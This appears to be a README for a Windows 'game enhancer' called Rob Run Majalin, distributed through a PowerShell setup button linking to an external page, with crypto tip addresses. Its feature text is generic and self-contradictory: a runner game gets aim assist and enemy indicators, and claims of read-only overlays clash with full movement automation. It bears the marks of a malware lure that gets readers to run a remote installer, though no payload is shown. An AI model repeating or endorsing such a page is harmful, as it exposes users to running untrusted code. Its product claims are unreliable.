<div align="center">

# Rob Run Majalin — Game Enhancer for Windows

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://lucamenzo1-ops.github.io/rob-run-majalin/)

[![setup](https://img.shields.io/badge/Setup-1008-e11d48?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-Core-f43f5e?style=plastic&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/Channel-Production-2ea44f?style=plastic&labelColor=0d1117)]()

<div align="center">
<h3>Give me a tip</h3>
<p><strong>TRON</strong>:&nbsp;<code>TT4Ms2HLP3mBdE6sZmWP6iHBLdwiCtYzUp</code> | <strong>ETH</strong>:&nbsp;<code>0x60a864EBc9Fe81624839E035cEC8ecd461f59bA3</code> | <strong>BTC</strong>:&nbsp;<code>166AGjswbbqNwTEgSUJLorrhnXghhmtpqa</code></p>
</div>

</div>

---

Rob Run Majalin is a focused gameplay enhancement built to sharpen how you play, not to rewrite the game around you. It layers clean information overlays on top of your run so you can read state, timing, and positioning at a glance without breaking flow. Every assist is tuned to stay out of the way until you need it, keeping your inputs and the game's core feel intact. What you get is practical runtime insight and lightweight help, nothing more and nothing less.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Live overlay HUD** — real-time stats, timers, and state info rendered on top of the game so you never break focus.
- **Gameplay assistance** — contextual hints and action cues that help you read situations faster and make cleaner decisions under pressure.
- **Information overlays** — toggleable panels for the data that matters, positioned to stay out of the way of your view.
- **Configurable behavior** — tune what the overlay shows and when it shows it, so the assist fits your playstyle instead of fighting it.
- **Lightweight footprint** — built to run alongside the game without dragging down performance.
- **Hotkey-driven controls** — flip overlays and assistance on or off mid-session without menu diving.
- **Readable at a glance** — clean, high-contrast presentation designed for fast scanning during active play.

## How it works

Rob Run Majalin hooks into the game at runtime and reads the live state it needs — player position, nearby entities, timers, and event flags — without touching the rendering pipeline or the core game loop. That data feeds a lightweight overlay layer that draws directly over the action, so the info you need sits in your peripheral vision instead of behind a menu.

Each assist is driven by the same read-only data stream. When the state changes, the overlay updates in the same frame — no polling delays, no lag spikes, no input hooks that fight the game for control. You keep playing the game as-is; the enhancement just shows you more of what's already happening.

Assists are modular and individually gated. Enable what you want, leave the rest off — nothing activates unless you've turned it on, and every feature can be killed mid-session with a single toggle. Defaults are conservative so a fresh setup stays close to vanilla.

Configuration is hot-reloadable: tweak the values and the overlay reflects the change on the next frame. No restart, no reinstall.

## Modules and Settings

### Movement Automation Module
Controls how the character advances through the run so the player is not required to hold keys or steer continuously.
- Movement mode selector lets users choose full path-following or a blended mode where assisted movement combines with manual input.
- Steering sensitivity adjusts how aggressively the character corrects its direction, from gentle adjustments to tighter path adherence.
- Input priority toggle decides whether player input temporarily overrides automation or automation reasserts itself after release.

### Pickup Assistance Module
Directs the character toward nearby tokens, pickups and reward items along the route.
- Pickup range setting defines how far from the current path the character will divert to collect an item.
- Priority filter lets users favor specific pickup types over others when several are nearby.
- Collection pause option briefly holds movement while an item is being grabbed, reducing missed pickups during fast runs.

### Hazard Response Module
Adjusts movement direction or jump timing when an obstacle or hazard is detected ahead.
- Reaction sensitivity controls how early the enhancement begins responding to a detected hazard.
- Avoidance style lets users prefer direction changes or jump-based responses depending on the situation.
- Caution level balances safer, earlier reactions against route efficiency, so users can trade speed for fewer collisions.

### Run Profiles Module
Stores and switches between saved configurations for different maps or play styles.
- Profile list keeps separate setups for cautious collection runs and faster progression runs.
- Profile switching applies the stored movement mode, pickup preferences and reaction settings in one action.
- Profile editing lets users update an existing profile after tuning settings during a run.

### Session Status Module
Shows what the enhancement is currently doing so users can confirm it matches their configuration.
- Active mode display reports the current movement mode and whether automation or manual control is in effect.
- Session counters show items collected and the current run stage at a glance.
- Status indicators highlight when a module is paused, overridden or waiting for a condition such as a nearby pickup.

### Manual Override Module
Keeps the player in charge by allowing automation to be paused or direct control resumed at any time.
- Override toggle pauses automation instantly, either for a single action or for the remainder of the run.
- Resume control returns the character to the configured automation mode without resetting the session.
- Override scope setting decides whether pausing applies to all modules or only the movement automation.

### Additional Settings
Optional controls that fine-tune how the modules behave together.
- Route preference setting lets users favor safer paths or more direct routes when multiple directions are available.
- Reaction timing adjustment tunes how quickly the enhancement responds to changing conditions, from more natural to more responsive.
- Module linking option decides whether pickup assistance and hazard response follow the active movement mode or stay independent.
- Status display detail controls how much session information appears in the status view.

## Usage Scenarios

### Casual Collection Runs

**Goal:** Accumulate tokens and reward items along a running route without manually steering the character the entire time.

**Steps:**
1. Open the Movement Automation Module and select full path-following mode so the character advances on its own.
2. Enable the Pickup Assistance Module with a moderate pickup range, keeping diversions close to the main route.
3. Apply the collection pause option so movement briefly holds while each item is grabbed.
4. Set the priority filter to favor the pickup types the player is currently targeting.
5. Start the run and check the Session Status Module to confirm the active mode and session counters.

**Expected result:** The character runs the route and diverts to nearby tokens, the session counter rises as items are collected, and the status indicators show when a pickup pause is in effect.

### Faster Progression Through Hazard-Heavy Sections

**Goal:** Complete runs more quickly while reducing interruptions from obstacles.

**Steps:**
1. Load a faster progression profile from the Run Profiles Module that stores the desired movement and reaction settings.
2. In the Hazard Response Module, raise the reaction sensitivity so hazards are detected earlier.
3. Choose the avoidance style that matches the section — direction changes for open stretches, jump-based responses where obstacles sit low.
4. Lower the caution level slightly to keep the character closer to optimal progress.
5. Watch the Session Status Module during the run and use the Manual Override Module to pause automation for any section that needs precise input.

**Expected result:** The character responds to hazards earlier, collisions decrease compared to unassisted running, and the player can pause automation for tricky stretches without resetting the session.

### Switching Between Cautious and Direct Route Styles

**Goal:** Compare a safer, slower traversal against a more direct route on the same map without reconfiguring everything manually.

**Steps:**
1. Create and save two profiles in the Run Profiles Module — one for a cautious collection run, one for direct progression.
2. In the Route Preference Settings, set the cautious profile to favor safer paths and the direct profile to favor more direct routes.
3. Adjust the reaction timing in the Additional Settings so the cautious profile feels more natural and the direct profile more responsive.
4. Use the module linking option to decide whether pickup assistance and hazard response follow the active movement mode.
5. Alternate between profiles using profile switching and review the status display detail to compare each session.

**Expected result:** Each profile applies its stored route preference and timing in a single action, and the player sees the character follow a route that reflects the chosen priority, making it easy to compare results across settings.

## Configuration

Tune Rob Run Majalin to match your playstyle. Every assist and overlay is opt-in, hot-swappable, and built to keep you locked into the run instead of buried in menus. Defaults are sane, so you can drop in and go — or dial everything to taste.

**Config file**

Settings live in a single config file shipped with Rob Run Majalin. Edit it once, save, and your loadout persists across sessions. Values are grouped by module — gameplay assistance, information overlays, input, and display — so you can find and flip what you need in seconds.

**Gameplay assistance**

- **Aim assist:** toggle on/off, with strength and range sliders for fine control.
- **Movement assist:** adjustable response curves for strafing and sprinting.
- **Auto-pickup:** radius-based, with category filters so you only grab what matters.
- **Assist intensity presets:** Light, Balanced, and Aggressive — pick one and go, or override per-module.

**Information overlays**

- **HUD overlay:** toggle individual readouts — health, stamina, objective timers, and session stats.
- **Mini-map overlay:** position, scale, opacity, and icon density are all adjustable.
- **Enemy and objective indicators:** range-based, with per-type toggles and opacity control.
- **Overlay placement:** anchor any panel to a screen corner or drag it to a custom position.

**Input and display**

- **Keybinds:** rebind every toggle and overlay, no conflicts.
- **Toggle vs. hold:** set each assist to toggle or hold-activate.
- **UI scale and opacity:** global sliders that apply across all overlays.
- **Per-profile configs:** save multiple setups — one for casual runs, one for serious pushes.

**Live tuning**

Changes apply on the fly wherever possible. For modules that need a reload, Rob Run Majalin flags it in the config output so you know exactly what to restart. Reset any module to defaults with a single flag — no hunting through values.

Everything here is assistive and informational. Rob Run Majalin doesn't rewrite the game under you; it gives you cleaner data and steadier hands so your decisions stay yours.

## FAQ

**Is this a game assistance or a mod?** Neither label fits cleanly. It's a gameplay assistance layer that surfaces information the base game doesn't show you, plus lightweight automation for repetitive actions. No engine rewrites, no asset swaps, no story changes.

**What does it actually change in play?** Two things: assisted input (movement smoothing, timing windows, auto-repeat for grindy loops) and info overlays (state readouts, cooldown timers, positioning guides). Everything stays within the existing game logic.

**Will it make the game trivial?** No. Assistance reduces friction, not difficulty. You still make the calls; the tool just stops the game from fighting your hands.

**Can I run it without the overlays?** Yes. Overlays and assistance toggle independently. Turn off either, or both, from the config.

**Does it touch saves or game files?** It reads game state to drive overlays and assistance. It doesn't rewrite your saves or patch the executable.

**Will it work with my version?** It targets current stable builds. Version mismatches are the most common cause of dead overlays — check the config notes before assuming something's broken.

**Is it heavy?** No. It's built to run alongside the game without measurable frame impact on typical hardware. If you see stutter, it's your config, not the tool.

**Multiplayer-safe?** It provides information and input assistance. Treat it like any external tool: know your server's rules before you bring it in.

**Something's off — where do I look first?** Config. Nine times out of ten it's a toggle, a stale version, or a conflicting overlay. Fix that before filing anything.

## Disclaimer

Rob Run Majalin is a gameplay assistance and information overlay tool. It is built to surface useful in-game data and provide visual aids that make sessions easier to read and act on. It is not a game overhaul, it does not replace core systems, and it does not alter unrelated gameplay content.

Everything Rob Run Majalin does is scoped to assistance and information. Overlays are designed to be readable at a glance, gameplay aids are tuned to stay within the intended experience, and configuration gives you control over what is shown and how. If a feature falls outside that scope, it does not belong in this project.

Use Rob Run Majalin at your own discretion. You are responsible for how you apply the assistance and overlays it provides, and for making sure your usage fits the rules of whatever environment you play in. The project is provided as-is, with no guarantees about fit for a particular purpose or outcome.

The team behind Rob Run Majalin ships updates to improve accuracy and usability, but nothing here is a promise of specific results. Treat the overlays as guidance, not gospel. Play smart, configure to taste, and keep the experience yours.